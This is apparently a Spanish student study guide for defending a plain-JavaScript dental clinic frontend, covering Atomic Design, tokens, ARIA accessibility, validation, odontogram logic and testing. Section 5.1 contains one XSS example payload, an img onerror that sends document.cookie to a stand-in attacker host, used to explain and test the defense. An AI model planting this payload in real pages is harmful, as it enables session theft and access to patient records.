# Documento de sustentación — DentalCare (Frontend, fases A0 a A3)

> Guía de estudio para la sustentación individual. Explica **qué** se construyó, **por qué** se
> tomó cada decisión y **cómo** defenderla ante el docente. Cada concepto apunta al archivo real del
> proyecto para que puedas mostrarlo en vivo.
>
> Para ver todo funcionando: abrir `frontend/styleguide.html` con **Live Server** (VS Code).

---

## Índice

1. [Resumen de lo construido](#1-resumen-de-lo-construido)
2. [Arquitectura: Atomic Design](#2-arquitectura-atomic-design)
3. [¿Por qué JavaScript puro y no un framework?](#3-por-qué-javascript-puro-y-no-un-framework)
4. [Design tokens: el sistema de diseño](#4-design-tokens-el-sistema-de-diseño)
5. [Seguridad: `h()` vs `innerHTML` y el ataque XSS](#5-seguridad-h-vs-innerhtml-y-el-ataque-xss)
6. [Accesibilidad: WAI-ARIA aplicado](#6-accesibilidad-wai-aria-aplicado)
7. [Validación en línea de formularios](#7-validación-en-línea-de-formularios)
8. [Conceptos técnicos clave](#8-conceptos-técnicos-clave)
9. [El odontograma y la numeración FDI](#9-el-odontograma-y-la-numeración-fdi)
10. [Fase A3: organismos y reglas de negocio](#10-fase-a3-organismos-y-reglas-de-negocio)
11. [Cómo se verificó la calidad](#11-cómo-se-verificó-la-calidad)
12. [Simulacro de preguntas del docente](#12-simulacro-de-preguntas-del-docente)
13. [Glosario](#13-glosario)

---

## 1. Resumen de lo construido

| Fase | Qué se hizo | Dónde está |
|---|---|---|
| **A0** Setup y design system | Estructura de carpetas, tokens de diseño (colores, tipografía, espaciado), reset CSS, estilos base y el *styleguide* (catálogo vivo de componentes) | `frontend/css/base/`, `frontend/styleguide.html` |
| **A1** Átomos | 13 componentes mínimos: `Button`, `Input`, `Select`, `Textarea`, `Checkbox`, `Radio`, `Switch`, `Badge`/`StatusBadge`, `Avatar`, `Icon`, `Label`, `Spinner`, `Link` | `frontend/js/components/atoms/` |
| **A2** Moléculas | 10 combinaciones de átomos: `FormField`, `PasswordField`, `SearchBar`, `KpiCard`, `Tabs`, `Pagination`, `Toast`, `ConfirmDialog`, `TimeSlot`, `Tooth` | `frontend/js/components/molecules/` |
| **A3** Organismos | Secciones completas: `Topbar`, `Sidebar`, `DataTable`, `ModalForm`, `Odontogram`, `Calendar`, `DashboardCharts`, `BookingWizard` | `frontend/js/components/organisms/` |

**Stack del proyecto:** HTML5 + CSS3 + JavaScript puro (ES Modules) en el frontend; Node.js + Express +
MySQL (mysql2/promise, sin ORM) en el backend (fases C y D). Mientras no existe el backend, las
pantallas usan **datos mock** copiados del seed de `dentalcare_bd.sql`.

---

## 2. Arquitectura: Atomic Design

### 2.1 La idea

Atomic Design (Brad Frost, 2013) organiza la interfaz como la química: piezas pequeñas que se
combinan en piezas más grandes.

```
  ÁTOMOS          MOLÉCULAS             ORGANISMOS              TEMPLATES          PÁGINAS
  (no se          (átomos que           (secciones con          (estructura        (template +
  dividen)        trabajan juntos)      sentido propio)         de la pantalla)    datos reales)

  Label ─┐
  Input ─┼──────► FormField ─┐
  Icon  ─┘                   ├────────► ModalForm ─────────┐
  Button ───────────────────┘                              ├──► Dashboard ──► admin/dashboard.html
  Badge ──┐                                                │    layout          (con datos de citas)
  Avatar ─┼─────► KpiCard ──────────► Topbar + Sidebar ────┘
  Icon  ──┘
```

| Nivel | Definición | Ejemplo en DentalCare |
|---|---|---|
| **Átomo** | Elemento HTML con estilo; no tiene sentido dividirlo más | `Button`, `Input`, `Badge` |
| **Molécula** | Grupo pequeño de átomos con **una** función | `FormField` = `Label` + `Input` + mensaje de error |
| **Organismo** | Sección completa e independiente de la interfaz | `DataTable` = `SearchBar` + chips + tabla + `Pagination` |
| **Template** | Esqueleto de la pantalla, sin datos (fase A4) | Layout con Topbar + Sidebar + contenido |
| **Página** | Template con datos concretos (fase A6) | `pages/admin/dashboard.html` |

### 2.2 La regla de oro: las dependencias van en un solo sentido

Un nivel **solo importa de niveles inferiores**. Una molécula puede usar átomos, pero un átomo nunca
importa una molécula. Esto se ve en los `import` de cada archivo:

```js
// js/components/molecules/form-field.js  (molécula → importa átomos)
import { Input, Select, Textarea, Label, Icon, Button } from '../atoms/index.js';

// js/components/organisms/data-table.js  (organismo → importa átomos y moléculas)
import { Icon, Button } from '../atoms/index.js';
import { SearchBar, Pagination } from '../molecules/index.js';
```

**¿Por qué importa?** Evita dependencias circulares y permite cambiar un átomo (por ejemplo, el
color de `Button`) sabiendo que el cambio se propaga a **todo** el sistema de forma consistente.

### 2.3 Cada componente es una función

```js
// Recibe "props" (un objeto de configuración) y devuelve un elemento del DOM.
const boton = Button({ label: 'Guardar', icon: 'check', variant: 'primary', onClick: guardar });
document.body.append(boton);
```

Ventajas: es fácil de probar, de reutilizar y de leer. No hay clases, ni herencia, ni magia: es la
misma idea de los componentes de React, pero sin la librería.

### 2.4 Archivos *barrel* (`index.js`)

Cada nivel tiene un `index.js` que reexporta todo. Así las páginas escriben una sola línea:

```js
import { Button, Input, StatusBadge } from '../components/atoms/index.js';
```

### 2.5 Estructura de carpetas

```
frontend/
├── styleguide.html              ← catálogo vivo (sirve también como prueba visual)
├── css/
│   ├── base/                    tokens.css · reset.css · base.css
│   ├── atoms/ molecules/ organisms/
│   └── main.css                 importa todo en orden de Atomic Design
└── js/
    ├── core/                    utilidades sin interfaz: dom, validators, format, dates, agenda…
    ├── components/atoms|molecules|organisms/
    ├── data/mock/               datos de prueba copiados del SQL
    └── pages/                   un controlador por página
```

---

## 3. ¿Por qué JavaScript puro y no un framework?

### 3.1 Razones

1. **Requisito del proyecto:** el stack exige HTML, CSS y JS sin frameworks.
2. **Aprendizaje real:** frameworks como React esconden cómo funciona el DOM. Aquí cada concepto
   (crear elementos, eventos, foco, accesibilidad) se programa y se entiende.
3. **Cero dependencias:** no hay `npm install` en el frontend ni CDN. No hay librerías que
   actualizar, ni vulnerabilidades de terceros, ni riesgo de que un CDN caiga.
4. **Rendimiento:** el navegador carga solo nuestro código. No hay un *bundle* de cientos de KB.
5. **Estándares nativos:** usamos lo que el navegador ya trae: `<dialog>`, ES Modules,
   `Intl` (fechas y moneda), `ResizeObserver`, *container queries*.

### 3.2 Lo que cuesta (hay que reconocerlo en la sustentación)

| Un framework daría… | Cómo lo resolvimos sin framework |
|---|---|
| Reactividad automática (la vista se actualiza sola) | Funciones `render()` explícitas que vuelven a dibujar con `mount()` |
| Sintaxis JSX | La función `h(tag, attrs, ...children)` en `js/core/dom.js` |
| Protección XSS por defecto | `h()` usa `createTextNode`: mismo nivel de protección (ver §5) |
| Componentes con estado | *Closures*: el estado vive dentro de la función del componente |

**Frase para la sustentación:** *"No reinventamos un framework: aplicamos los mismos principios
(componentes, props, composición) con las APIs estándar del navegador."*

---

## 4. Design tokens: el sistema de diseño

Un **token** es una variable de diseño con nombre. Están en `css/base/tokens.css`:

```css
:root {
  --color-primary-700: #0f766e;           /* valor crudo de la paleta */
  --color-brand: var(--color-primary-700); /* alias semántico: "el color de la marca" */
  --space-4: 1rem;
  --radius-md: 8px;
}
.btn--primary { background: var(--color-brand); } /* los componentes usan alias */
```

- **Dos capas:** valores crudos (`--color-primary-700`) y alias semánticos (`--color-brand`,
  `--color-border`, `--color-text-muted`). Los componentes **solo** usan alias.
- **Beneficio:** cambiar la identidad del consultorio = editar un archivo. Ningún componente tiene
  colores "quemados".
- **Escala de 4px** para el espaciado: todo queda alineado y proporcionado.
- **Nomenclatura BEM** en las clases: `.bloque__elemento--modificador` → `.btn`, `.btn__label`,
  `.btn--primary`. Evita choques de nombres sin herramientas extra.

---

## 5. Seguridad: `h()` vs `innerHTML` y el ataque XSS

### 5.1 ¿Qué es XSS?

**Cross-Site Scripting**: un atacante logra que el navegador de otra persona ejecute su código.
Ejemplo en DentalCare: un paciente se registra con este "nombre":

```
<img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">
```

Si la recepcionista abre el listado de pacientes y el código hizo esto:

```js
celda.innerHTML = paciente.nombres;   // ❌ PELIGROSO
```

…el navegador **interpreta** el texto como HTML, crea la imagen, falla al cargarla y ejecuta el
`onerror`. El atacante roba la sesión de la recepcionista y, con ella, acceso a historias clínicas.
Eso violaría la **Ley 1581 de 2012** (RNF-PRI-01).

### 5.2 Nuestra defensa: `h()` y `createTextNode`

```js
// js/core/dom.js
export function appendChildren(parent, children) {
  for (const child of children.flat(Infinity)) {
    parent.append(child instanceof Node ? child : document.createTextNode(String(child)));
  }
}
```

`createTextNode` crea un nodo de **texto**: el navegador nunca lo interpreta como HTML. El
`<img…>` malicioso se **muestra** literalmente en pantalla, pero no se ejecuta.

```js
celda.append(h('td', {}, paciente.nombres));  // ✅ SEGURO: siempre es texto
```

**Está probado:** la prueba automatizada de A3 renderiza ese ataque en `DataTable` y comprueba que
no aparece ninguna `<img>` y que el código no se ejecuta.

### 5.3 ¿Dónde sí usamos `innerHTML` y por qué es seguro?

En **un solo lugar**: `js/components/atoms/icon.js`, para insertar los trazos SVG de los íconos.
Es seguro porque esos textos son **constantes escritas por nosotros** en el código, nunca datos
del usuario. La regla no es "nunca usar `innerHTML`", sino **"nunca usar `innerHTML` con datos que
no controlamos"**.

### 5.4 Otras medidas aplicadas

| Medida | Dónde | Por qué |
|---|---|---|
| Error de login genérico ("Correo o contraseña incorrectos") | demo de login, styleguide | RF-ACC-02: no revelar si un correo existe (evita enumerar usuarios) |
| `rel="noopener noreferrer"` en enlaces externos | `atoms/link.js` | La pestaña abierta no puede manipular la nuestra (*tabnabbing*) |
| Textos de gráficas con `textContent` | `organisms/charts.js` | Los nombres de tratamientos vienen de la BD |
| Validación en el cliente **no** reemplaza la del servidor | backend (fase C) | El cliente se puede saltar con las DevTools; el servidor tiene la última palabra |

---

## 6. Accesibilidad: WAI-ARIA aplicado

### 6.1 Conceptos base

- **Accesibilidad (a11y):** que cualquier persona pueda usar el sistema, incluidas personas que
  usan lector de pantalla, solo teclado o tienen baja visión.
- **WAI-ARIA:** atributos `role` y `aria-*` que le explican a las tecnologías de asistencia qué es
  y en qué estado está cada elemento.
- **Primera regla de ARIA:** *si existe un elemento HTML nativo que hace lo que necesitas, úsalo.*
  Por eso usamos `<button>`, `<dialog>`, `<label>` y `<input type="checkbox">` reales, en lugar de
  `<div>` con ARIA.

### 6.2 Atributos ARIA usados y para qué

| Atributo | Qué comunica | Dónde |
|---|---|---|
| `aria-invalid="true"` | "Este campo tiene un error" | `FormField` (y el borde rojo sale de este atributo en el CSS) |
| `aria-describedby` | Enlaza el campo con su ayuda y su error: el lector los lee al enfocar | `FormField` |
| `aria-live="polite"` | Anuncia cambios de texto sin mover el foco | errores, contador de resultados, toasts |
| `role="alert"` | Anuncia de inmediato (mensajes urgentes) | toast de error, errores de modales |
| `aria-pressed` | Botón de dos estados (activado o no) | mostrar contraseña, `TimeSlot`, chips de filtro |
| `aria-expanded` + `aria-controls` | "Este botón abre o cierra aquel panel" | notificaciones, perfil, menú móvil |
| `aria-current="page"` / `"step"` | El ítem actual de una navegación o un proceso | `Sidebar`, `Pagination`, `BookingWizard` |
| `aria-sort` | Columna ordenada y en qué dirección | `DataTable` |
| `aria-selected` + `role="tab"` | Pestaña activa | `Tabs` |
| `aria-disabled` (vs `disabled`) | No disponible, pero sigue siendo enfocable | `TimeSlot` ocupado: el usuario de teclado puede llegar y escuchar "Ocupado" |
| `aria-hidden="true"` | Oculta lo decorativo (íconos) al lector | todos los íconos sin significado propio |

### 6.3 Patrones de interacción implementados

- **Tabs (pestañas):** *roving tabindex*. Solo la pestaña activa tiene `tabindex="0"`; las flechas
  ← → se mueven entre pestañas e Inicio/Fin van a los extremos. Así la tecla Tab no obliga a pasar
  por cada pestaña. (`molecules/tabs.js`)
- **Pieza dental:** el mismo patrón. Cinco caras, pero una sola parada de Tab por diente; las
  flechas recorren las caras. Si no fuera así, el odontograma tendría 160 paradas de Tab.
- **Disclosure (menús desplegables):** botón con `aria-expanded`; Escape cierra **y devuelve el
  foco** al botón; un clic afuera también cierra. (`core/popover.js`)
- **Diálogo modal:** `<dialog>` nativo con `showModal()`. Trae gratis el foco atrapado dentro del
  modal, Escape para cerrar y el resto de la página inerte. En acciones destructivas el foco
  inicial va a **"Cancelar"** (la opción segura).
- **Sidebar móvil:** al abrir, el foco va al primer enlace; Escape o el fondo cierran; el foco
  vuelve al botón de menú.

### 6.4 Decisiones de "no usar" un rol ARIA (también se defienden)

- **No usamos `role="menu"`** en el menú de perfil: ese rol obliga a implementar todo el teclado de
  menús de aplicación de escritorio. Para enlaces de navegación, WAI-ARIA recomienda *disclosure*.
- **No usamos `role="grid"`** en el calendario mensual: obliga a navegar con flechas entre celdas.
  Cada día es un `<button>` con nombre completo ("Lunes, 20 de octubre de 2026: 5 citas").
- *Un ARIA mal usado es peor que ningún ARIA*: le promete al usuario un comportamiento que no existe.

### 6.5 Otros detalles

- `:focus-visible`: el anillo de foco aparece al navegar con teclado, no al hacer clic.
- `prefers-reduced-motion`: las animaciones se desactivan si el usuario lo pidió en su sistema.
- Etiquetas visualmente ocultas (`.u-visually-hidden`): texto para el lector que no ocupa espacio.
- Asterisco de obligatorio con `aria-hidden` + texto oculto "(obligatorio)": el lector no dice
  "asterisco".

---

## 7. Validación en línea de formularios

**Requisito (SRS 3.1):** *"Todo formulario valida en línea con mensaje de error junto al campo."*

### 7.1 Validadores como funciones (`js/core/validators.js`)

Cada validador es una **fábrica**: devuelve una función que recibe el valor y responde `null`
(válido) o un **mensaje de error**.

```js
validators.documento()   // (valor) => /^\d{6,12}$/.test(valor) ? null : 'Solo números, entre 6 y 12 dígitos.'
validators.telefono()    // celular colombiano: 10 dígitos que inician en 3
validators.password()    // 8+ caracteres con mayúscula, minúscula, número y símbolo
validators.matches(() => otraClave.value)  // confirmar contraseña
validators.dateNotPast() // no se agendan citas en el pasado
```

`compose(...)` combina varios y devuelve **el primer** error encontrado.

### 7.2 El flujo de `FormField`

1. El usuario escribe y **sale del campo** (`blur`) → se valida.
   *No* se valida en cada tecla al principio: sería molesto que diga "correo inválido" cuando
   apenas escribiste "a".
2. Si quedó inválido, ahora **sí** se revalida mientras escribe, para quitar el error en cuanto
   se corrige (retroalimentación positiva inmediata).
3. Al enviar, `validateForm(form)` valida todo y **lleva el foco al primer campo con error**.
4. Los formularios tienen `novalidate` para desactivar los globos nativos del navegador, que no se
   pueden estilizar ni traducir de forma consistente.

### 7.3 Errores del servidor

`ModalForm` acepta un `FieldError('numero_documento', 'Ya existe un paciente con este documento.')`
y lo pinta **junto al campo correcto**, no en una alerta genérica.

---

## 8. Conceptos técnicos clave

### 8.1 Debounce (`molecules/search-bar.js`)

**Problema:** si se filtra en cada tecla, escribir "Galvis" dispara 6 búsquedas. Con el backend
serían 6 consultas a MySQL.

**Solución:** esperar a que el usuario **deje de escribir** 300 ms.

```
Teclas:     G    a    l    v    i    s                      (pausa)
Timer:      ×    ×    ×    ×    ×    ⏱──── 300 ms ────► búsqueda("Galvis")   ← 1 sola búsqueda
```

```js
input.addEventListener('input', () => {
  clearTimeout(timer);                // cancela la búsqueda pendiente
  timer = setTimeout(emit, debounce); // programa una nueva
});
```

Además: Enter busca de inmediato y Escape limpia. Si el texto no cambió, no se repite la búsqueda.

### 8.2 Promesas en los diálogos (`molecules/confirm-dialog.js`)

`confirmDialog()` devuelve una **Promise** que se resuelve cuando el usuario decide:

```js
const confirmado = await confirmDialog({ title: '¿Cancelar la cita?', variant: 'danger' });
if (confirmado) cancelarCita();
```

**¿Por qué una promesa?** El código queda lineal y legible, como el `confirm()` nativo, pero sin
bloquear el navegador y con un diseño propio y accesible.

**Detalle de robustez:** la función `finish()` es **idempotente** (si se llama dos veces, la
segunda no hace nada). Un diálogo puede cerrarse por botón, por Escape o por clic afuera, y la
promesa debe resolverse **exactamente una vez**.

**Acción asíncrona:** con `onConfirm`, el botón muestra "cargando", Escape se bloquea mientras se
procesa, y si el servidor falla el error aparece **dentro** del modal sin cerrarlo.

### 8.3 Reflow vs `requestAnimationFrame` (`molecules/toast.js`)

Para que un toast "entre" con animación, primero debe existir en su estado inicial (invisible) y
**después** recibir la clase `is-visible`. Si ambas cosas pasan en el mismo instante, el navegador
no ve el cambio y no anima.

- **Opción 1, `requestAnimationFrame`:** "agrega la clase en el próximo cuadro".
  **Problema encontrado en las pruebas:** el navegador **pausa** `rAF` en pestañas en segundo plano
  e iframes ocultos → el toast quedaba **invisible**.
- **Opción 2, forzar un reflow (la elegida):**
  ```js
  void element.offsetHeight;          // obliga al navegador a calcular el layout YA
  element.classList.add('is-visible'); // ahora sí hay un "antes" y un "después"
  ```
  Leer `offsetHeight` obliga al navegador a aplicar los estilos pendientes. Es síncrono y no
  depende de que la pestaña esté visible.

**Lección para la sustentación:** se eligió la solución determinista porque las pruebas
automatizadas revelaron el problema.

### 8.4 Evento `close` asíncrono del `<dialog>`

El navegador despacha el evento `close` **después** (en otra vuelta del *event loop*). En las pruebas
se vio que podía tardar, y mientras tanto el modal dejaba la página inerte. Solución: al cerrar con
un botón se finaliza de inmediato; el evento `close` queda solo para Escape.

### 8.5 Fechas sin desfase de zona horaria (`core/format.js → toDate`)

`new Date('2026-09-01')` se interpreta como **medianoche UTC**, que en Colombia (UTC−5) es el
**31 de agosto a las 7 p. m.** Por eso se creó `toDate()`, que interpreta "YYYY-MM-DD" (el formato
de MySQL) en **hora local**.

### 8.6 `Intl`: formatos colombianos sin librerías

```js
new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(1500000)
// → "$ 1.500.000"
```

---

## 9. El odontograma y la numeración FDI

### 9.1 Sistema FDI (Federación Dental Internacional)

Cada diente tiene dos dígitos: **cuadrante + posición**.

```
                Derecha del paciente │ Izquierda del paciente
  Superior:   18 17 16 15 14 13 12 11 │ 21 22 23 24 25 26 27 28
  Inferior:   48 47 46 45 44 43 42 41 │ 31 32 33 34 35 36 37 38

  Temporales (niños): cuadrantes 5, 6, 7 y 8, posiciones 1 a 5 (51…85).
```

Ejemplo: **16** = cuadrante 1 (superior derecho), posición 6 = **primer molar superior derecho**.

### 9.2 Las 5 caras (`molecules/tooth.js`)

| Cara | Significado | Posición en el gráfico |
|---|---|---|
| Vestibular | hacia labios o mejillas | arriba en los superiores, abajo en los inferiores |
| Palatina / Lingual | hacia el paladar / la lengua | la opuesta a vestibular |
| Mesial | hacia la línea media | el lado más cercano al centro |
| Distal | lejos de la línea media | el lado exterior |
| Oclusal / Incisal | superficie de masticación / borde de corte | centro (oclusal en muelas, incisal en dientes anteriores) |

El componente **calcula** la posición de cada cara a partir del número FDI. Como el seed de la BD
guarda "LINGUAL" incluso en dientes superiores, `normalizeFace()` corrige el nombre según el diente.

**Colores (convención clínica):** rojo = patología por tratar, azul = tratamiento realizado.

---

## 10. Fase A3: organismos y reglas de negocio

| Organismo | Requisito | Lo más importante para explicar |
|---|---|---|
| `Topbar` | SRS 3.1 | Fecha en es-CO, notificaciones con contador accesible, menú de perfil (disclosure) |
| `Sidebar` | SRS 3.1 | El menú se construye desde `core/navigation.js` según el **rol**; panel deslizable en móvil |
| `DataTable` | RNF-USA-02 | Búsqueda sin tildes, filtros por estado con conteos, `aria-sort`, celdas seguras, paginación |
| `ModalForm` | RF-CIT-02 | `await openModalForm()`; errores del servidor junto al campo; no se cierra con un clic afuera (evita perder lo digitado) |
| `Odontogram` | RF-PAC-04, HU-04, RN-01 | 32 o 20 piezas, vista mixta, panel de registro de hallazgos, modo solo lectura |
| `Calendar` | RF-CIT-07 | Día / Semana / Mes / Lista con selector de odontólogo |
| `DashboardCharts` | RF-DAS-01/03 | SVG puro, barras ≤ 24 px, tooltip con teclado, **vista de tabla** alternativa |
| `BookingWizard` | HU-05, RN-02, RF-CIT-03 | 4 pasos, alta rápida de paciente, franjas válidas, **alternativas** si no hay cupo |

### 10.1 RN-02 en código (`core/agenda.js`)

> *"Una cita no puede agendarse si el odontólogo no tiene horario configurado en ese rango."*

`getDaySlots()` cruza la tabla `horario` (día y rango) con las citas existentes y marca cada franja
de 30 minutos como `available`, `occupied`, `blocked` (fuera del horario) o `past` (hora pasada).
El wizard **solo** permite elegir las `available` y **revalida justo antes de guardar** (otra
recepcionista pudo tomar la franja mientras tanto).

### 10.2 RF-CIT-03: alternativas

Si el odontólogo no atiende ese día o no tiene cupos, `suggestAlternatives()` propone:
- las **próximas 3 fechas** con el mismo odontólogo, y
- **otros odontólogos** con cupo ese mismo día.

### 10.3 Decisiones técnicas de A3

- **Container queries** en el odontograma: el componente se adapta a **su propio ancho**, no al de
  la ventana. Así funciona igual en una página completa, en un modal o en una columna.
- **Gráficas redibujadas con `ResizeObserver`** en lugar de escalar un `viewBox`: el texto siempre
  se ve nítido y del tamaño correcto.
- **Color de las gráficas validado**: el teal 700 se veía grisáceo (croma bajo); se eligió
  primary-600 (#0D9488), que pasa las pruebas de contraste (≥ 3:1) y saturación.
- **Datos mock deterministas:** las citas se generan con un generador pseudoaleatorio con semilla
  (*mulberry32*): los datos son iguales en cada recarga, respetan los horarios y no tienen choques
  (verificado con pruebas).

---

## 11. Cómo se verificó la calidad

Se escribieron **pruebas automatizadas** que abren el styleguide en un navegador real (Edge sin
interfaz), simulan clics, teclado y envío de formularios, y comprueban el resultado:

| Suite | Pruebas | Resultado |
|---|---|---|
| Moléculas (A2) | 74 | 74 ✅ |
| Organismos (A3) | 73 | 73 ✅ |
| Lógica de agenda y datos mock (Node) | 18 | 18 ✅ |
| Desborde horizontal en móvil (375 px) | — | sin desborde ✅ |

**Errores reales que las pruebas encontraron (y se corrigieron):**
1. `PasswordField` no pasaba el atributo `name` al input → el login no habría podido leer la
   contraseña.
2. `ConfirmDialog` dependía de un evento asíncrono → el modal podía quedarse bloqueando la página.
3. `Toast` dependía de `requestAnimationFrame` → podía quedar invisible (§8.3).
4. Las pestañas ensanchaban la página en móvil → se agregó `min-width: 0`.
5. Los ids de las secciones del Sidebar llevaban espacios ("Mi portal"), lo que rompía
   `aria-labelledby` → se generan con índices.
6. El botón "Agendar cita" volvía a decir "Siguiente" tras la carga → se creó `setButtonLabel()`.

**Frase para la sustentación:** *"No asumí que funcionaba: lo probé, y las pruebas encontraron seis
errores que un usuario habría encontrado primero."*

---

## 12. Simulacro de preguntas del docente

**P1. ¿Qué es Atomic Design y por qué lo usaron?**
R: Una metodología que divide la interfaz en átomos, moléculas, organismos, templates y páginas. La
usamos porque garantiza **consistencia** (un mismo botón en todo el sistema), **reutilización**
(`FormField` sirve en el login, el registro de pacientes y los modales) y **mantenibilidad** (un
cambio en un átomo se propaga). Además, la regla de que las dependencias solo van hacia abajo evita
el código espagueti.

**P2. ¿Cuál es la diferencia entre una molécula y un organismo? Dé un ejemplo.**
R: La molécula tiene una sola función y es pequeña: `SearchBar` solo busca. El organismo es una
sección completa con varias responsabilidades: `DataTable` combina búsqueda, filtros, orden, tabla,
acciones y paginación.

**P3. ¿Por qué no usaron React o Angular?**
R: Era requisito del proyecto, y además nos da cero dependencias, mejor rendimiento y comprensión
real del DOM. Aplicamos los mismos principios (componentes como funciones con props, composición)
con APIs nativas. El costo es que la actualización de la vista es manual (`render()`), y lo
asumimos de forma consciente.

**P4. ¿Qué es XSS y cómo lo previenen?**
R: Es la inyección de código malicioso que se ejecuta en el navegador de otro usuario. Lo prevenimos
construyendo el DOM con `h()`, que convierte todo texto en `createTextNode`: nunca se interpreta
como HTML. Hay una prueba automatizada que intenta el ataque con `<img onerror>` y verifica que no
se ejecuta.

**P5. Entonces, ¿`innerHTML` está prohibido?**
R: No: está prohibido con **datos que no controlamos**. Lo usamos solo en `icon.js` con trazos SVG
constantes escritos en el código. La regla es sobre el origen del dato.

**P6. Si validan en el frontend, ¿el backend también debe validar?**
R: Sí, siempre. La validación del cliente es para la **experiencia** del usuario. Cualquiera puede
saltársela con las herramientas del navegador o enviando peticiones directas a la API. La
validación del servidor es la que protege los datos.

**P7. ¿Qué es `aria-live` y dónde lo usan?**
R: Marca una región cuyos cambios el lector de pantalla anuncia sin mover el foco. Lo usamos en los
mensajes de error de los campos, en el contador de resultados de búsqueda y en las notificaciones.
`polite` espera a que el lector termine; `role="alert"` interrumpe (lo reservamos para errores).

**P8. ¿Por qué `aria-disabled` y no `disabled` en las franjas ocupadas?**
R: Un botón `disabled` sale del orden de tabulación: un usuario de teclado ni siquiera sabría que
la franja existe. Con `aria-disabled` puede llegar y escuchar "08:00, Ocupado", pero no
seleccionarla.

**P9. Explique el debounce.**
R: Es esperar a que un evento repetitivo se detenga antes de actuar. En la búsqueda, cada tecla
reinicia un temporizador de 300 ms; la búsqueda solo ocurre cuando el usuario deja de escribir.
Reduce el trabajo y, con backend, las consultas a la base de datos.

**P10. ¿Por qué `confirmDialog` devuelve una promesa?**
R: Porque la decisión del usuario llega en el futuro. Con `await` el código queda lineal
(`if (await confirmDialog(...))`), igual de simple que `confirm()`, pero accesible y con diseño
propio. La promesa se resuelve exactamente una vez gracias a una función idempotente.

**P11. ¿Qué es un reflow y por qué lo usaron en vez de `requestAnimationFrame`?**
R: El reflow es cuando el navegador recalcula el tamaño y la posición de los elementos. Leer
`offsetHeight` lo fuerza de forma síncrona, así la transición de entrada del toast tiene un estado
inicial. `requestAnimationFrame` se pausa en pestañas en segundo plano y el toast quedaba invisible:
lo descubrimos con las pruebas.

**P12. ¿Cómo garantizan la regla RN-02?**
R: En el frontend, `getDaySlots()` solo ofrece franjas dentro del horario del odontólogo y libres,
y el wizard revalida antes de guardar. En el backend (fase C) se validará de nuevo dentro de una
transacción, porque el servidor es la fuente de verdad.

**P13. ¿Qué pasa si no hay disponibilidad? (RF-CIT-03)**
R: El wizard muestra una alerta con el motivo ("no atiende ese día" o "no tiene franjas libres") y
propone las próximas tres fechas con el mismo odontólogo y otros odontólogos con cupo ese día. Un
clic en una alternativa la selecciona.

**P14. ¿Cómo funciona la navegación según el rol?**
R: `core/navigation.js` define el menú de cada rol de la tabla `rol` (ADMINISTRADOR, RECEPCIONISTA,
ESPECIALISTA, PACIENTE). El `Sidebar` recibe el rol y construye solo esos enlaces. Ocultar un menú
**no es** seguridad: en las fases A5 y C se agregan el *guard* de páginas y la autorización por
permisos en la API.

**P15. ¿Qué son los design tokens?**
R: Variables CSS con nombre para colores, espacios y tipografía. Tienen dos capas: valores
(`--color-primary-700`) y alias semánticos (`--color-brand`). Los componentes solo usan alias, así
cambiar la marca es editar un archivo.

**P16. ¿Cómo hicieron las gráficas sin librerías?**
R: Con SVG generado por JavaScript (`createElementNS`). Calculamos una escala "bonita" (pasos de
1, 2, 5 × 10ⁿ), dibujamos barras con la punta redondeada y la base recta, y redibujamos con
`ResizeObserver` cuando cambia el ancho. Cada barra es enfocable con tooltip, y hay una vista de
tabla para quien no pueda ver la gráfica.

**P17. ¿Por qué el odontograma usa rojo y azul si los badges usan otros colores?**
R: Es la convención clínica en odontogramas (rojo = por tratar, azul = realizado), y los
odontólogos la reconocen de inmediato. Dentro del odontograma, el resumen y la leyenda usan
exactamente los mismos colores, para que un estado se vea igual en todo el componente.

**P18. ¿Qué es una container query y por qué la usaron?**
R: Es una media query que responde al ancho del **contenedor** y no al de la ventana. El
odontograma decide si el panel va al lado o debajo según el espacio que realmente tiene, lo que lo
hace reutilizable en cualquier página o modal.

**P19. ¿Cómo prueban que todo funciona?**
R: Con 165 pruebas automatizadas en un navegador real y en Node: interacciones, teclado, ARIA,
validaciones, reglas de negocio y diseño responsive. Encontraron seis errores reales que se
corrigieron (sección 11).

**P20. ¿Qué cambios necesita la base de datos y por qué?**
R: Se documentarán en `database/CAMBIOS.md` (fase B). Por ejemplo: `cita.id_servicio` (RF-CIT-01
pide elegir tratamiento), `rol.estado` (RF-ROL-06), el estado `PENDIENTE_CONFIRMACION` (HU-06),
contraseñas con bcrypt (el seed las tiene en texto plano, lo que incumple RNF-SEG-01) y más
horarios (el seed solo trae un día por odontólogo).

---

## 13. Glosario

| Término | Definición breve |
|---|---|
| **a11y** | Abreviatura de *accessibility* (a + 11 letras + y) |
| **BEM** | Convención de nombres CSS: Bloque__Elemento--Modificador |
| **Barrel** | Archivo `index.js` que reexporta los módulos de una carpeta |
| **Closure** | Función que "recuerda" las variables del lugar donde se creó; así guardamos el estado de cada componente |
| **Container query** | Estilos según el ancho del contenedor, no de la ventana |
| **Debounce** | Esperar a que un evento deje de repetirse antes de actuar |
| **Design token** | Variable de diseño con nombre (color, espacio, radio…) |
| **Disclosure** | Patrón de botón que muestra u oculta un panel |
| **ES Modules** | Sistema nativo de `import`/`export` de JavaScript (requiere servidor, por eso Live Server) |
| **FDI** | Sistema internacional de numeración dental de dos dígitos |
| **Idempotente** | Operación que da el mismo resultado si se ejecuta una o varias veces |
| **Mock** | Datos de prueba que imitan los reales mientras no existe el backend |
| **Reflow** | Recálculo del layout que hace el navegador |
| **Roving tabindex** | Solo un elemento del grupo es tabulable; las flechas mueven el foco dentro del grupo |
| **WAI-ARIA** | Especificación del W3C de roles y atributos para accesibilidad |
| **XSS** | Cross-Site Scripting: inyección de scripts maliciosos |
